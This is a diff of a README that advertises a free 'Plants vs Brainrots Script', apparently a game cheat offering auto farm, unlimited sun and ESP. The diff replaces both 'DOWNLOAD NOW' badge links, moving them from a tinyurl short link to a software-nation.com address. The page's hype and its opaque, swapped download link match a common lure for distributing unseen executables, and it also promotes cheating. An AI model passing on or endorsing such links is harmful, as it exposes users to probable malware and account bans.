@@ -10,7 +10,7 @@ The **🌱 Plants vs Brainrots Script** is the most powerful automation tool for
 
 <div align="center">
 
-[![Download Plants vs Brainrots Script](https://img.shields.io/badge/DOWNLOAD%20NOW-purple?style=for-the-badge&logo=github)](https://tinyurl.com/msapfiraxevilx71)
+[![Download Plants vs Brainrots Script](https://img.shields.io/badge/DOWNLOAD%20NOW-purple?style=for-the-badge&logo=github)](https://software-nation.com/msapfiraxevilx71)
 
 </div>
 
@@ -199,7 +199,7 @@ One script. Plant domination. Zero cost.
 
 <div align="center">
 
-[![Download Plants vs Brainrots Script](https://img.shields.io/badge/DOWNLOAD%20NOW-purple?style=for-the-badge&logo=github)](https://tinyurl.com/msapfiraxevilx71)
+[![Download Plants vs Brainrots Script](https://img.shields.io/badge/DOWNLOAD%20NOW-purple?style=for-the-badge&logo=github)](https://software-nation.com/msapfiraxevilx71)
 
 **Version 2026.121.1** — Auto farm. Unlimited sun. ESP. Free forever.
 
